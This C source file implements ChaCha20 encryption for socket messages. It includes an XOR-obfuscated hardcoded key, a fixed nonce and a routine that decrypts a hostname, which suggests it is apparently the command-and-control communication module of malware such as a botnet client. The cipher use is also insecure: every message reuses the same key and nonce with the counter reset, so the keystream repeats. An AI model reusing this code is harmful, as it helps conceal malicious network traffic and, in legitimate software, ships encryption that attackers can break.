#define _GNU_SOURCE
#include "headers/cipher.h"
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>

#define CHACHA20_ROUNDS 10

static uint32_t rotl32(uint32_t x, int n) {
    return (x << n) | (x >> (32 - n));
}

static uint32_t load32le(const uint8_t *p) {
    return p[0] | (p[1] << 8) | (p[2] << 16) | (p[3] << 24);
}

static void store32le(uint8_t *p, uint32_t x) {
    p[0] = x & 0xff;
    p[1] = (x >> 8) & 0xff;
    p[2] = (x >> 16) & 0xff;
    p[3] = (x >> 24) & 0xff;
}

static void chacha20_init(chacha20_ctx *ctx, const uint8_t *key, const uint8_t *nonce) {
    ctx->state[0] = 0x61707865;
    ctx->state[1] = 0x3320646e;
    ctx->state[2] = 0x79622d32;
    ctx->state[3] = 0x6b206574;
    ctx->state[4] = load32le(key + 0);
    ctx->state[5] = load32le(key + 4);
    ctx->state[6] = load32le(key + 8);
    ctx->state[7] = load32le(key + 12);
    ctx->state[8] = load32le(key + 16);
    ctx->state[9] = load32le(key + 20);
    ctx->state[10] = load32le(key + 24);
    ctx->state[11] = load32le(key + 28);
    ctx->state[12] = 0;
    ctx->state[13] = load32le(nonce + 0);
    ctx->state[14] = load32le(nonce + 4);
    ctx->state[15] = load32le(nonce + 8);
}

static void chacha20_block(chacha20_ctx *ctx, uint8_t *out) {
    uint32_t x[16];
    memcpy(x, ctx->state, sizeof(x));

    for (int i = 0; i < CHACHA20_ROUNDS; i++) {
        x[0] += x[4]; x[12] = rotl32(x[12] ^ x[0], 16);
        x[1] += x[5]; x[13] = rotl32(x[13] ^ x[1], 16);
        x[2] += x[6]; x[14] = rotl32(x[14] ^ x[2], 16);
        x[3] += x[7]; x[15] = rotl32(x[15] ^ x[3], 16);
        x[8] += x[12]; x[4] = rotl32(x[4] ^ x[8], 12);
        x[9] += x[13]; x[5] = rotl32(x[5] ^ x[9], 12);
        x[10] += x[14]; x[6] = rotl32(x[6] ^ x[10], 12);
        x[11] += x[15]; x[7] = rotl32(x[7] ^ x[11], 12);
        x[0] += x[4]; x[12] = rotl32(x[12] ^ x[0], 8);
        x[1] += x[5]; x[13] = rotl32(x[13] ^ x[1], 8);
        x[2] += x[6]; x[14] = rotl32(x[14] ^ x[2], 8);
        x[3] += x[7]; x[15] = rotl32(x[15] ^ x[3], 8);
        x[8] += x[12]; x[4] = rotl32(x[4] ^ x[8], 7);
        x[9] += x[13]; x[5] = rotl32(x[5] ^ x[9], 7);
        x[10] += x[14]; x[6] = rotl32(x[6] ^ x[10], 7);
        x[11] += x[15]; x[7] = rotl32(x[7] ^ x[11], 7);
        x[0] += x[5]; x[15] = rotl32(x[15] ^ x[0], 16);
        x[1] += x[6]; x[12] = rotl32(x[12] ^ x[1], 16);
        x[2] += x[7]; x[13] = rotl32(x[13] ^ x[2], 16);
        x[3] += x[4]; x[14] = rotl32(x[14] ^ x[3], 16);
        x[8] += x[13]; x[5] = rotl32(x[5] ^ x[8], 12);
        x[9] += x[14]; x[6] = rotl32(x[6] ^ x[9], 12);
        x[10] += x[15]; x[7] = rotl32(x[7] ^ x[10], 12);
        x[11] += x[12]; x[4] = rotl32(x[4] ^ x[11], 12);
        x[0] += x[5]; x[15] = rotl32(x[15] ^ x[0], 8);
        x[1] += x[6]; x[12] = rotl32(x[12] ^ x[1], 8);
        x[2] += x[7]; x[13] = rotl32(x[13] ^ x[2], 8);
        x[3] += x[4]; x[14] = rotl32(x[14] ^ x[3], 8);
        x[8] += x[13]; x[5] = rotl32(x[5] ^ x[8], 7);
        x[9] += x[14]; x[6] = rotl32(x[6] ^ x[9], 7);
        x[10] += x[15]; x[7] = rotl32(x[7] ^ x[10], 7);
        x[11] += x[12]; x[4] = rotl32(x[4] ^ x[11], 7);
    }

    for (int i = 0; i < 16; i++) {
        store32le(out + 4 * i, x[i] + ctx->state[i]);
    }
    ctx->state[12]++;
}

static const uint8_t chacha20_obfuscated_key[CHACHA20_KEY_SIZE] = {
    0x5c, 0x4b, 0x5d, 0x36, 0x44, 0x33, 0x5d, 0x34,
    0x24, 0x54, 0x5d, 0x5e, 0x24, 0x44, 0x47, 0x44,
    0x24, 0x44, 0x41, 0x33, 0x4a, 0x4f, 0x3d, 0x2a,
    0x42, 0x34, 0x50, 0x26, 0x3b, 0x37, 0x3b, 0x31
};

static const uint8_t chacha20_nonce[CHACHA20_NONCE_SIZE] = {
    'S', 'T', 'Y', '-', 'U', 'L', 'T', '-', '0', '0', '0', '1'
};

static void chacha20_get_key(uint8_t *key) {
    for (int i = 0; i < CHACHA20_KEY_SIZE; i++) {
        uint8_t x = (i % 2 == 0) ? 0x09 : 0x07;
        key[i] = chacha20_obfuscated_key[i] ^ x;
    }
}

static void chacha20_crypt(const uint8_t *key, const uint8_t *nonce, const uint8_t *in, uint8_t *out, size_t len) {
    chacha20_ctx ctx;
    uint8_t block[CHACHA20_BLOCK_SIZE];
    size_t i, pos = 0;

    chacha20_init(&ctx, key, nonce);

    while (pos < len) {
        chacha20_block(&ctx, block);
        for (i = 0; i < CHACHA20_BLOCK_SIZE && pos + i < len; i++) {
            out[pos + i] = in[pos + i] ^ block[i];
        }
        pos += i;
    }
}

static int send_full(int sock, const uint8_t *buf, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        ssize_t ret = send(sock, (const char *)buf + sent, len - sent, MSG_NOSIGNAL);
        if (ret <= 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) {
                usleep(10000);
                continue;
            }
            return -1;
        }
        sent += (size_t)ret;
    }
    return 0;
}

int send_encrypted(int sock, const uint8_t *data, size_t len) {
    uint8_t key[CHACHA20_KEY_SIZE];
    uint8_t header[2];
    size_t total_len = len + 2;
    uint8_t *buf = malloc(total_len);
    int ret;

    if (!buf) return -1;

    chacha20_get_key(key);
    chacha20_crypt(key, chacha20_nonce, data, buf + 2, len);

    header[0] = (len >> 8) & 0xff;
    header[1] = len & 0xff;
    buf[0] = header[0];
    buf[1] = header[1];

    ret = send_full(sock, buf, total_len);
    free(buf);
    return ret;
}

int recv_decrypt(const uint8_t *in, size_t in_len, uint8_t *out, size_t *out_len) {
    uint8_t key[CHACHA20_KEY_SIZE];

    if (in_len < 2) return -1;

    size_t payload_len = ((size_t)in[0] << 8) | in[1];
    if (in_len < payload_len + 2) return -1;
    if (*out_len < payload_len) return -1;

    chacha20_get_key(key);
    chacha20_crypt(key, chacha20_nonce, in + 2, out, payload_len);
    *out_len = payload_len;
    return 0;
}

int chacha20_decrypt_hostname(const uint8_t *in, size_t in_len, char *out, size_t out_size) {
    uint8_t key[CHACHA20_KEY_SIZE];

    if (in_len < 2) return -1;

    size_t payload_len = ((size_t)in[0] << 8) | in[1];
    if (in_len < payload_len + 2) return -1;
    if (out_size < payload_len + 1) return -1;

    chacha20_get_key(key);
    chacha20_crypt(key, chacha20_nonce, in + 2, (uint8_t *)out, payload_len);
    out[payload_len] = '\0';
    return 0;
}
